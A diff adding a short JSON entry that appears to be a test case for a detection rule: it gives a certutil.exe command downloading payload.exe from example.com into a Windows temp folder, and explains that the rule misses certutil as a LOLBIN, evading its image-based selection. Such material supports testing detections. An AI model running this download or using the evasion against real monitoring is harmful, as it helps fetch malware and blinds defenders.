@@ -1,0 +1,6 @@
+[
+  {
+    "output": "certutil.exe -urlcache -f http://example.com/payload.exe C:\\Windows\\TEMP\\payload.exe",
+    "explanation": "The rule explicitly lists several binaries (bitsadmin, curl, powershell) used for downloading or execution but omits certutil.exe, which is a common LOLBIN (Living Off the Land Binary) used for similar purposes. Using an unlisted binary avoids the 'Image' selection criteria entirely."
+  }
+]
